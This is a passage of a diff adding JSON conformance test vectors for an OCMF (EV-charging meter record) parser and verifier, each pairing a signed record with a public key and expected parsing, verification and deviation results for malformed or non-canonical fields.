+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/escaped-obis-code",
+   "group": "table",
+   "description": "RI written with a \\u0030 escape, a lawful spelling of 0 [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.\\u0030\\u0030*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A63C499A5D2B1A4DC9F9FD9A00DC1F25B4447A658328A5EE0349839F319818200220682FFF3B92EA6F5AFC0BDB52DB62E648FF3AFAFF9238FAF105CA7539757F908C\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/meter-serial-missing",
+   "group": "deviation",
+   "description": "MS absent, as 89 % of real records have it [OCMF Tab. 3]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100F9ACBD6E36617753F29508E8A651D655B89BEAFC7100B9149723D5C8FE47C1E7022059B2CE88D6DF547B94D520EEB10FA3CDE09DAF9F3C3C28579EAA8D8D38A17DB3\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["MeterSerialMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/format-version-missing",
+   "group": "deviation",
+   "description": "FV absent — allowed by Tab. 1, refused by the reference verifier",
+   "record": "OCMF|{\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100AA4CF752B48A0E2DE630116894F4AF17969CFF74DCF5E4EA7FDC9F16820F325002204D380E1B1BB9320422C1C4846C978E8E6BC90F0ED8E751EA20371998623E402A\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/format-version-is-number",
+   "group": "deviation",
+   "description": "FV as a JSON number, as one corpus record writes it",
+   "record": "OCMF|{\"FV\":1.3,\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022034B13FC74336C0F2D7C968FBC0321C446CF625D9DB8581E6FD26C3335FE3BB9302205B66C7691A8B1F30D14B970BCAC9181B3187A240D6DD2AEF3FCBC8789EDB0630\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ScalarFieldNotAString"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/identification-flags-missing",
+   "group": "deviation",
+   "description": "IF absent although the text requires an array even when empty (issue #31)",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100D7C5B4F5014B6932B58741F5F3BF9486B1183E14783DD3845E81C18E9DE8BCDA02202E6881FAAC68E8CD5CC2E1C46FAB2C11C73910EF27E2665C1C4F01649A3C2857\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationFlagsMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/identification-type-missing",
+   "group": "deviation",
+   "description": "IT absent although Tab. 4 marks it 1..1",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100BC6EDC3EF66F8581BC44CA0E20A2A8FB4832264B240A953B842FFF9D6B8C0DB60220341F08397F63A4EDB03FA12B3E631B2F9DA6B7EBF0B355E24093B14C30771AF2\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationTypeMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/pagination-leading-zero",
+   "group": "deviation",
+   "description": "PG counter with a leading zero, which Tab. 2 forbids",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T0001\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022063E0C81D01EB942FE8E3ED616D7DDF4F0FF1B328CC85B456C465E76B61B2691902202BD66131D36DB843FEA68EF58AA10A69B81B6D110E5B446C7713C3B4772F9D9B\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["PaginationLeadingZero"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/rv-is-string",
+   "group": "deviation",
+   "description": "RV as a JSON string with leading zeros, as Isabellenhütte writes it",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":\"00000100.000\",\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221008724C370B91D9E90B4A99194304D66CA0777C8660775A6BEC8E29075393CB5E70220487ACA1DD511CA8F46F5A2F997C934A3D6420DE5D0D9777EDD7EEAD1137A35EE\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["RvIsString"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/rv-is-padded-string",
+   "group": "deviation",
+   "description": "RV as a string padded to a display width, found in the reference corpus",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":\"     100.000\",\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100EFCBBF7F3F64C9D0D31AB3EA2BD8B526677A8C44DEF9AA65FF572A22EAF79E100220161EFCC1049E5464BBCFFF1AF36E295A00095B52DEEE9A0E20D03842592B924F\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["RvIsString"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/carried-forward-time",
+   "group": "deviation",
+   "description": "a second reading that omits TM, TX and RT, as LEM's DCBM writes them",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"RV\":4.405,\"RI\":\"01-00:C1.08.00*FF\",\"RU\":\"kWh\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402204C50404440F7EF529C78E29C56878F73E02865AE937F0C433994389A790CF4ED0220405166B58A607DC82E35E6660B96354CB62DE13763E4F3E24CDCB86C3F4B2133\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["CarriedForwardMandatoryField"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "deviation/time-offset-with-colon",
+   "group": "deviation",
+   "description": "TM offset written ±hh:mm rather than ±hhmm",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+01:00 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C2A0B0728CC1E3FA4D90643554AF026D997D6DAD22758110ED83D02D34326FBD022023074301594943E1B60F3DCFF08153D74CC4B5D0EDE2B4A4F002FF7782B3CB5B\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["TimeOffsetWithColon"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/time-dot-milliseconds",
+   "group": "deviation",
+   "description": "TM milliseconds separated by `.` rather than the specified `,`",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00.000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210092D88F9E2722AA29FAB16D5C8A0905E6155B0679FC479F2798CF04A1F390B9F602203B9E95BBBDDFD39AF45534E90DEDB67373A7B0983BE3B04A09033B91CA80F57F\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["TimeDotMilliseconds"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/time-status-missing",
+   "group": "deviation",
+   "description": "TM with no synchronisation letter [OCMF Tab. 19]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100FECE7E44FB3344991FE5BF430963357D4F0FCC9CDECFF5EF0396ED4A57AD090D022052A984A40AC32CCA953895BFFADE85DD41D8C3DD9203A8A32CEFB250F185F9E8\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["TimeStatusMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/obis-non-canonical",
+   "group": "deviation",
+   "description": "RI in the form every record in the reference corpus uses",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"1-b:1.8.0\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022044846EADCB802730BA02BEFBC302985BCD586E6935765BD10E99F9B7A019393002202F4D2579C46E79CD4576C7744872D26F4126516C01FDA2E58467F16D6A729403\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ObisNonCanonical"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/duplicate-key",
+   "group": "deviation",
+   "description": "the same key twice in one object — undefined by the spec's JSON reference",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":1,\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100B7BF417340939CC9CE6A4A4F6928C680F36BC50DF55535BADA2813B40CCD9E8402206B60F18EC3A7253643FD4723864C2642309957359A338DACC12F1231D0182CDC\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["DuplicateKey"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/non-canonical-number",
+   "group": "deviation",
+   "description": "a number with a leading zero, which RFC 8259 forbids",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":0100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207F6DE5193E33E809E425B6C358105F96070A5172D44DD899DA5B1E1C70C6664A022031BED79298762635FBC963B4C29097631B57F34911BDDCEF157EE85F1FE24240\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["NonCanonicalNumber"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/undefined-table-value",
+   "group": "deviation",
+   "description": "RU = sec, a unit Tab. 20 does not define — two readings in the reference corpus",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"sec\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100DCC9F742E7B890A396ED01D3785D78C9B25B5EB63A7C93261AB58FCF8337C02E0220397C2C863EA77395E00B61FC35A9DD621C356432D0202613EC3CE1160414B1F5\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["UndefinedTableValue"], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "deviation/undefined-meter-state",
+   "group": "deviation",
+   "description": "ST = Q, a letter Tab. 10 does not define — kept verbatim, never billable",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"Q\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402205029A5310AF9DD39BB5E743F036F5BF8BBBEB29D070A40CD055BB006434989060220050E37F8F77F170DA70EA0C081F19AA0A2F329E1808801C9B92877674DCC8621\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["UndefinedTableValue"], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "deviation/undefined-error-flag",
+   "group": "deviation",
+   "description": "EF = X, a flag character Tab. 7 does not define — still a fault",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"X\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022018C389B3DFC4207D50123BF91F3B2666F169E44878778602B01C95278968B80902202B011E123B9B59C3DADDE2DADADDE826D859F05B4626BDAD243565E746395EFD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["UndefinedTableValue"], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "deviation/identification-flags-cardinality",
+   "group": "deviation",
+   "description": "IF with five elements where Tab. 4 states 0..4, one per flag group",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_RS_TLS\",\"ISO15118_PNC\",\"PLMN_SMS\",\"RFID_PSK\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100CB53D946F859B26418A2EDB7E28A71E0D23D05BD483AC4A44B944787E6861B6302204E2601C6FF442A4AEE59E16DB3E32EF80965096FEB0D8AEFD3FFD46A772C230C\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationFlagsCardinality", "IdentificationFlagsDuplicateGroup"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/identification-flags-duplicate-group",
+   "group": "deviation",
+   "description": "two RFID flags: the record states the assignment was both absent and unsecured",
